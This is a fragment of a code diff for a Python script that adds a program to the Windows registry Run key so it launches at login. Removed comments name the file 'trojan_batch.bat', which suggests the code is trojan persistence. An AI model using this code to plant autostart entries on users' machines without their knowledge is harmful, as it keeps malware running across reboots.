@@ -5,21 +5,7 @@ from winreg import *
 import winreg as reg  
 import os              
   
-def AddToRegistry(address): 
-  
-    # # __file__ is the instant of 
-    # # file path where it was executed  
-    # pth = os.path.dirname(os.path.realpath(__file__)) 
-      
-    # # name of the file with extension 
-    # s_name="trojan_batch.bat"     
-      
-    # # joins the file name to end of path address 
-    # address=os.path.join(pth,s_name)  
-
-    # key we want to change is HKEY_CURRENT_USER  
-    # key value is Software\Microsoft\Windows\CurrentVersion\Run 
-    
+def AddToRegistry(address):
     key_value = r'Software\Microsoft\Windows\CurrentVersion\Run'
       
     # open the key to make changes to 
